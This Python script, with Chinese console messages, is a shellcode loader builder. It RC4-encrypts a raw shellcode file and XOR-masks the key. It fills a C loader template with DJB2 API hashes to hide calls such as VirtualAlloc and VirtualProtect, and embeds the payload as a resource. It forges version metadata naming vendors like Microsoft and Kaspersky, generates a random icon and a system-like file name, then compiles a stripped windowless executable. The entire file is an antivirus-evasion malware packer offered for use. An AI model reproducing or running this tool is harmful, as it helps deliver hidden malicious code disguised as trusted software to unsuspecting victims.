#!/usr/bin/env python3
import argparse, subprocess, os, sys, random, string, struct

# ── RC4 ────────────────────────────────────────
def rc4_ksa(key: bytes) -> list:
    S = list(range(256)); j = 0
    for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
    return S

def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = rc4_ksa(key); i = j = 0; out = bytearray()
    for b in data: i = (i+1)%256; j = (j+S[i])%256; S[i],S[j]=S[j],S[i]; out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)

# ── DJB2 ────────────────────────────────────────
def djb2(s: str) -> int:
    h = 5381
    for c in s: h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    return h

def read_file(path: str) -> bytes:
    if not os.path.exists(path): print(f"[-] 找不到: {path}"); sys.exit(1)
    with open(path,"rb") as f: return f.read()

def bytes_to_c_array(raw: bytes) -> str:
    return ", ".join(f"0x{b:02x}" for b in raw)

# ── 随机文件名 ──────────────────────────────────
COMPANY_POOL = ["Microsoft","Adobe","Oracle","Intel","Dell","HP","Samsung","LG","Sony","Panasonic","Nvidia","AMD","VMware","Citrix","McAfee","Symantec","Kaspersky","ESET"]
PROD_POOL    = ["Update","Runtime","Service","Platform","Framework","Engine","Manager","Provider","Connector","Bridge","Agent","Monitor","Control","Setup","Installer","Launcher","Host","Shell","Core","Helper"]
DESC_POOL    = ["System Component","Background Service","Update Utility","Runtime Helper","Platform Service","Management Console","Support Application"]

def random_exe_name():
    first = ["Acro","Brcc","Ctf","Dism","EhStor","Fix","Gps","Hvt","Ias","Jt","Ktm","Logon","Mui","Nis","Opt","Pro","Qry","Rel","Spp","Tpm","Uso","Vss","Wldp","Xbox","Yg","Zap","Win","Sys","Edge","Chrome","One","Note","Sec","Net","Dvd","Fnt","Inst","Mgr","Ph","Rec","Svc","Task","Usr","Vol","Web","Xaml","Zip"]
    second = ["Broker","Cache","Core","Diag","Events","Ext","Flow","Host","Init","Launcher","Loader","Master","Notify","Obj","Panel","Proxy","Queue","Runner","Server","Shell","Sink","Stack","Thunk","Tools","Util","View","Worker","Setup","Engine","Backup"]
    suffix = ["","Svc","Mgr","Ui","x64","x86","64","32","Srvc","App"]
    name = random.choice(first)+random.choice(second)+random.choice(suffix)
    if random.random()>0.5: name+="_"+"".join(random.choices(string.ascii_lowercase,k=random.randint(4,8)))
    return name+".exe"

# ── 图标生成 ─────────────────────────────────────
def make_ico() -> bytes:
    w,h = 32,32
    pixels = b""
    r0,g0,b0 = random.randint(30,220), random.randint(30,220), random.randint(30,220)
    for y in range(h):
        for x in range(w):
            rr = min(255,max(0,r0+random.randint(-25,25)))
            gg = min(255,max(0,g0+random.randint(-25,25)))
            bb = min(255,max(0,b0+random.randint(-25,25)))
            pixels += struct.pack("BBBB", bb, gg, rr, 0xFF)
    bmp_size = 40 + w*h*4
    mask_row = ((w+31)//32)*4
    mask_size = mask_row * h
    ico_entry_size = bmp_size + mask_size
    ico = struct.pack("<HHH", 0, 1, 1)
    ico += struct.pack("<BBBBHHII", w, h, 0, 0, 1, 32, ico_entry_size, 22)
    ico += struct.pack("<IIIHHIIIIII", 40, w, h*2, 1, 32, 0, w*h*4, 0,0,0,0)
    ico += pixels
    ico += b"\x00" * mask_size
    return ico

# ── VERSIONINFO 资源脚本 ──────────────────────────
def make_rc(payload_bin_path: str, ico_path: str, company: str, prod: str, desc: str, fname: str) -> str:
    ver = f"{random.randint(1,15)}.{random.randint(0,99)}.{random.randint(0,9999)}.{random.randint(1,9999)}"
    fv = ver.split(".")
    return f'''#include <windows.h>

LANGUAGE LANG_ENGLISH, SUBLANG_DEFAULT

101 RCDATA "{payload_bin_path}"

100 ICON "{ico_path}"

1 VERSIONINFO
FILEVERSION     {fv[0]},{fv[1]},{fv[2]},{fv[3]}
PRODUCTVERSION  {fv[0]},{fv[1]},{fv[2]},{fv[3]}
FILEFLAGSMASK 0x3f
FILEFLAGS 0
FILEOS VOS_NT_WINDOWS32
FILETYPE VFT_APP
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904B0"
    BEGIN
      VALUE "CompanyName",      "{company}\\0"
      VALUE "FileDescription",  "{desc}\\0"
      VALUE "FileVersion",      "{ver}\\0"
      VALUE "InternalName",     "{fname}\\0"
      VALUE "LegalCopyright",   "\\251 {company}. All rights reserved.\\0"
      VALUE "OriginalFilename", "{fname}.exe\\0"
      VALUE "ProductName",      "{company} {prod}\\0"
      VALUE "ProductVersion",   "{ver}\\0"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x409, 1200
  END
END
'''

# ══════════════════════════════════════════════

def build(shellcode_file, template_file, output_file, arch, gcc_path, windres_path):
    print(f"[*] 读取 Shellcode: {shellcode_file}")
    raw = read_file(shellcode_file)
    print(f"    大小: {len(raw)} bytes")

    key = bytes([random.randint(1,255) for _ in range(16)])
    print(f"[*] RC4 密钥: {key.hex()}")

    enc = rc4_encrypt(raw, key)
    print(f"[*] 加密完成: {len(enc)} bytes")

    xor_byte = random.randint(1,255)
    obf_key = bytes([b ^ xor_byte for b in key])
    print(f"[*] XOR 混淆: 0x{xor_byte:02X}")

    # ── API Hashes ──
    api_hashes = {
        "HX_VirtualAlloc":     djb2("VirtualAlloc"),
        "HX_VirtualProtect":   djb2("VirtualProtect"),
        "HX_FindResourceA":    djb2("FindResourceA"),
        "HX_LoadResource":     djb2("LoadResource"),
        "HX_LockResource":     djb2("LockResource"),
        "HX_SizeofResource":   djb2("SizeofResource"),
    }
    hash_block = "\n".join(f"#define {k}  0x{v:08X}UL" for k,v in api_hashes.items())

    # ── 填充模板 ──
    print(f"[*] 读取 C 模板: {template_file}")
    tmpl = read_file(template_file).decode("utf-8")

    for ph in ["/* __KEY_PLACEHOLDER__ */","/* __XOR_BYTE__ */","/* __HASHES__ */"]:
        if ph not in tmpl:
            print(f"[-] 找不到占位符: {ph}"); sys.exit(1)

    filled = tmpl.replace("/* __KEY_PLACEHOLDER__ */", bytes_to_c_array(obf_key))
    filled = filled.replace("/* __XOR_BYTE__ */", f"0x{xor_byte:02X}")
    filled = filled.replace("/* __HASHES__ */", hash_block)

    # ── 随机元数据 ──
    company = random.choice(COMPANY_POOL)
    prod    = random.choice(PROD_POOL)
    desc    = random.choice(DESC_POOL)
    fname   = os.path.splitext(os.path.basename(output_file))[0]

    tmp_c   = "_bld_loader.c"
    tmp_bin = "_bld_payload.bin"
    tmp_rc  = "_bld_resource.rc"
    tmp_res = "_bld_resource.o"
    tmp_ico = "_bld_icon.ico"

    try:
        with open(tmp_bin, "wb") as f: f.write(enc)
        with open(tmp_c, "w", encoding="utf-8") as f: f.write(filled)

        icon_data = make_ico()
        with open(tmp_ico, "wb") as f: f.write(icon_data)
        print(f"[*] 生成图标: {len(icon_data)} bytes")

        rc_content = make_rc(tmp_bin, tmp_ico, company, prod, desc, fname)
        with open(tmp_rc, "w", encoding="utf-8") as f: f.write(rc_content)

        # windres
        print(f"[*] windres: 编译资源...")
        tgt = "--target=pe-x86-64" if arch=="64" else "--target=pe-i386"
        wr = subprocess.run([windres_path,"-i",tmp_rc,"-o",tmp_res,tgt], capture_output=True, text=True)
        if wr.returncode!=0: print(f"[-] windres:\n{wr.stderr}"); sys.exit(1)

        # GCC
        m = f"-m{arch}"
        libs = "-lkernel32 -luser32 -ladvapi32 -lshell32 -lole32 -lgdi32"
        cmd = f'"{gcc_path}" {tmp_c} {tmp_res} -o "{output_file}" {m} -mwindows -s -O2 -w {libs}'
        print(f"[*] GCC: 编译...")
        gr = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        if gr.returncode!=0:
            print(f"[-] GCC 编译失败:\n{gr.stderr}")
            sys.exit(1)

        size = os.path.getsize(output_file)
        print(f"[+] 成功 => {output_file} ({size} bytes)")
        print(f"    公司: {company} | 产品: {company} {prod}")

    except Exception as e:
        print(f"[-] 错误: {e}"); sys.exit(1)
    finally:
        for f in [tmp_c,tmp_bin,tmp_rc,tmp_res,tmp_ico]:
            if os.path.exists(f): os.remove(f)
        print("[*] 清理完毕。")

# ══════════════════════════════════════════════

if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Shellcode Loader Builder")
    p.add_argument("-s","--shellcode",help="RAW Shellcode (.bin)")
    p.add_argument("-t","--template",default="loader_template.c")
    p.add_argument("-o","--output",default=None,help="输出文件名 (默认随机)")
    p.add_argument("--32",action="store_true",dest="arch32")
    p.add_argument("--gcc",default="",help="GCC全路径")
    p.add_argument("--hashes",action="store_true",help="API hash")
    args = p.parse_args()

    if args.hashes:
        for a in ["VirtualAlloc","VirtualProtect","FindResourceA","LoadResource","LockResource","SizeofResource"]:
            print(f"  HX_{a:<20s} => 0x{djb2(a):08X}UL")
        sys.exit(0)

    if not args.shellcode: p.error("请指定 -s")

    if args.gcc:
        gcc_path = args.gcc
    elif args.arch32:
        gcc_path = r"D:\cc\mingw32_full\mingw32\bin\gcc.exe"
    else:
        gcc_path = "gcc"

    windres_path = os.path.join(os.path.dirname(gcc_path),"windres.exe") if os.path.sep in gcc_path else "windres"
    output_file = args.output if args.output else random_exe_name()

    build(args.shellcode, args.template, output_file, "32" if args.arch32 else "64", gcc_path, windres_path)
